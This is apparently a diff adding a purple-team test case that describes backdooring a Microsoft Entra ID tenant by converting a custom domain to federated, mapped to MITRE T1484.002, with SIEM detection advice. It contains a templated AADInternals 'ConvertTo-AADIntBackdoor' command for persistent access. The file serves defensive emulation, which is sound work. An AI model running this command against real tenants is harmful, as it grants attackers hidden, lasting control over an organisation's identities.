@@ -1,0 +1,23 @@
+name: Configure a custom federated domain in Entra ID
+description: Convert a custom domain in the Entra ID tenant into a federated domain. This can be used for persistent access into the tenant.
+platforms:
+- entraid
+guidance:
+- PS> ConvertTo-AADIntBackdoor -AccessToken {{ access_token }} -DomainName "{{ attacker_domain }}"
+block:
+- ''
+detect:
+- Monitor for unusual domain federation via the SIEM. Examine Entra logs for actions that "Set domain authentication" to "federated".
+- https://www.inversecos.com/2021/11/how-to-detect-azure-active-directory.html
+controls:
+- SIEM
+metadata:
+  id: b07b0ea7-24ed-49c2-bfc8-a6b14060a7c1
+  tid: T1484.002
+  tactic: TA0005
+  x_tools:
+  - AADInternals
+  x_references:
+  - https://o365blog.com/post/aadbackdoor/
+  x_vectr_id: b07b0ea7-24ed-49c2-bfc8-a6b14060a7c1
+  isv: 1
